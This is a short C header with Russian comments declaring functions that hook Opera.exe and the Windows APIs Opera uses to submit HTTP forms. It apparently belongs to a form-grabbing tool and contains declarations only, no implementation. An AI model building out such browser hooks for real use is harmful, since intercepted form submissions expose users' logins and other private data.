#ifndef		__opera_h__
#define		__opera_h__

#include <windows.h>


//*********************************************************************
//  HookOpera - функция вешает хуки на Opera.exe 
//  Функция проверяет в каком процессе она запущена, снимает старые 
//  хуки, хуки на нужные api
//*********************************************************************
bool HookOpera();

//*********************************************************************
//  HookOperaApi - функция вешает хуки на API,
//  которые использует Opera для отправки http-форм
//*********************************************************************
bool HookOperaApi();

//*********************************************************************
//  IsOpera функция возвращает истину если данный процес
//  является процессом Opera
//*********************************************************************
bool WINAPI IsOpera();

#endif		//__opera_h__